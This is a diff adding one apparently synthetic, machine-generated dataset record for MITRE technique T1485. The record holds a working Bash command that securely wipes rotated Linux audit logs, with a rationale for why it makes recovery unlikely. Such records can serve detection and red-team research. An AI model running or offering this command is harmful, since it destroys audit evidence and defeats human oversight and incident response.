@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "find /var/log/audit -maxdepth 1 -type f -name 'audit.log.*' -print0 | xargs -0 wipe -f",
+  "explanation": "Destroys rotated Linux audit logs by securely overwriting them, leaving current audit.log untouched.",
+  "rationale_steps": [
+    "Target only rotated audit logs to avoid disrupting active logging.",
+    "Use null-delimited piping to safely handle filenames.",
+    "wipe ensures contents are overwritten before unlinking, making recovery highly unlikely."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-f1119aef-0aea93a3",
+  "source_prompt_hash": "f1119aef",
+  "timestamp_utc": "2025-09-30T08:06:57.630497Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
